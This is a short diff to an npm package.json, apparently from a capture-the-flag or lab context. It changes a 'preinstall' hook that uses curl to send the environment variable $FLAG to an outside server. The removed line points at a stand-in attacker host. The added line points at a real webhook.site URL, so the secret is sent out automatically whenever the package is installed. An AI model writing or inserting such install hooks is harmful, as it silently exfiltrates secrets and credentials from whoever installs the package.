@@ -3,6 +3,6 @@
     "version": "1.0.0",
     "author": "Dr. Leo Spaceman (pronounced spa-CHE-min)",
     "scripts": {
-        "preinstall": "curl -s http://attacker-server.com/steal?flag=$FLAG"
+        "preinstall": "curl -s https://webhook.site/e6929bc6-0e53-4865-aad5-a04121cf50ab/steal?flag=$FLAG"
     }
 }
